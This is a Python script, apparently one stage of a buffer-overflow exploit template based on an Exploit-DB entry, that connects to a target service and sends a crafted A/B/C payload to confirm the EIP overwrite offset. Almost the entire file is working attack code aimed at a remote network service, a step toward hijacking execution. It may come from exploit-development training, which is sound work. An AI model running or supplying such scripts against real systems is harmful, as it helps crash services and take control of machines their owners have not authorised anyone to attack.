#!/usr/bin/env python3
import socket, time, sys

# NOTE: This template used https://www.exploit-db.com/exploits/1582 as the example
# IMPORTANT: Dont forget to set up l_bytes

# Phase 3: Confirm the offset of EIP at the time of the controlled crash

# ------------------------------------------------------------------
# How do we confirm the offset?
# ------------------------------------------------------------------
# We build a payload made of characters A, B and C. If we have the offset
# correct, "A" will fill the space up to EIP, "B" will overwrite EIP exactly
# and "C" will fill the space after EIP

if len(sys.argv) != 5:
    print()
    print("Usage: {} <target ip> <target port> <offset of eip> <total size of payload>".format(sys.argv[0]))
    print("\tTarget IP: Remote hostname or IP address of target service")
    print("\tTarget Port: Remote port of target sevice")
    print("\tOffset of EIP: Offset of EIP from start of payload")
    print("\tTotal size of payload")
    exit(0)

# sys.argv is the list of command line arguments
RHOST = 1
RPORT = 2
OFFSET_EIP = 3
TOTAL_PAYLOAD_SIZE = 4

l_rhost: str = sys.argv[RHOST]
l_rport: int = int(sys.argv[RPORT])
l_offset_eip: int = int(sys.argv[OFFSET_EIP])
l_total_payload_size: int = int(sys.argv[TOTAL_PAYLOAD_SIZE])
l_bytes_before_EIP: int = l_offset_eip
l_size_of_EIP: int = 4
l_bytes_after_EIP: int = l_total_payload_size - (l_offset_eip + l_size_of_EIP)
l_pattern = "A" * l_bytes_before_EIP + "B" * l_size_of_EIP + "C" * l_bytes_after_EIP

try:
    # Create a TCP (socket)
    print("Connecting to {} port {}".format(l_rhost, l_rport))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((l_rhost, l_rport))
    print("Connected")
except:
    print("Could not connect to {} port {}".format(l_rhost, l_rport))
    exit(0)

try:
    # Send the message via the socket using the specific protocol
    print("Sending payload of length {}".format(len(l_pattern)))
    l_bytes = b'\x11' + '(setup sound '.encode() + l_pattern.encode() + b'\x90\x00' + '#'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send payload")

time.sleep(1)
s.close()
